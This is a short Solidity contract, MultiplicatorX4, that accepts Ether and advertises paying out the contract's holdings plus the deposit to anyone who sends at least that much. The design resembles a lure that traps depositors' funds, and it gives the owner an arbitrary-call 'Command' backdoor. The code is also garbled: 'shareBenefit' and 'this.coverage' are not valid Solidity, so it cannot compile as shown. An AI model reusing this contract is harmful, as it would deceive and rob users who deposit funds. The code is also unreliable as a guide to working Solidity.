// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Manager = msg.sender;

    function() public payable{}

    function withdrawFunds()
    payable
    public
    {
        require(msg.sender == Manager);
        Manager.shareBenefit(this.coverage);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Manager);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.coverage)
        {
            adr.shareBenefit(this.coverage+msg.value);
        }
    }
}